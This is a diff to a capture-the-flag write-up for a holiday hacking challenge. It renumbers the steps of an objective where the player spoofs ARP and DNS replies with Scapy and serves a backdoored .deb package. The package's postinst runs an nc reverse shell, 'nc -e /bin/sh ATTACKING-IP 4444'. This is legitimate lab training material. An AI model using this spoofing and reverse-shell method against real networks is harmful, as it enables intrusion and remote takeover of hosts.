@@ -363,14 +363,9 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
 
 **Answer:** "Tanta Kringle"
 
-- Step 1: Make sure you can reach 10.6.6.35 --> "ping 10.6.6.35"
-- Step 2: Do an "ls" of the home folder.
-- Step 3: Read "HELP.md"
-
-
-- Step 4: Run "tshark -i eth0"
-- Step 5: Notice that .35 is asking about .53
-- Step 6: Create ARP response: 
+- Step 1: Run "tshark -i eth0"
+- Step 2: Notice that .35 is asking about .53
+- Step 3: Create ARP response: 
 
 ~~~
         ether_resp = Ether(dst=packet.hwsrc, type=0x806, src=macaddr)
@@ -392,7 +387,7 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
         sendp(response, iface="eth0")
 ~~~
 
-- Step 7: Create DNS response:
+- Step 4: Create DNS response:
 
 ~~~
 
@@ -408,17 +403,17 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
     )
 ~~~
 
-- Step 8: Note file being requested with http request.
+- Step 5: Note file being requested with http request.
 	- "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"
 
-- Step 9: Create that file and make it call back to listener on local machine.
-- Step 10: Determine payload to use. Simple nc reverse shell should work.
+- Step 6: Create that file and make it call back to listener on local machine.
+- Step 7: Determine payload to use. Simple nc reverse shell should work.
 
 ~~~
 nc -e /bin/sh ATTACKING-IP 4444
 ~~~
 
-- Step 11: Build the deb package with the above payload in the "postinst"
+- Step 8: Build the deb package with the above payload in the "postinst"
 	- "dpkg -x [debfile] work"
 	- "mkdir work/DEBIAN"
  	- "cd DEBIAN"
@@ -449,10 +444,10 @@ nc -e /bin/sh [attacking ip] 4444
 	- "python3 -m http.server 80"
 
 
-- Step 11: Start listener with "nc -nvlp 4444" 
-- Step 12: Get ARP and DNS responses going
-- Step 13: Navigate to file contents in question:
-	- "cat *.txt | grep recused"
+- Step 9: Start listener with "nc -nvlp 4444" 
+- Step 10: Get ARP and DNS responses going
+- Step 11: Navigate to file contents in question:
+	- "cat *.txt | grep recused" (Looking for the individual who recused themselves from the vote.)
 
 # Objective 10: Defeat Fingerprint Sensor
 
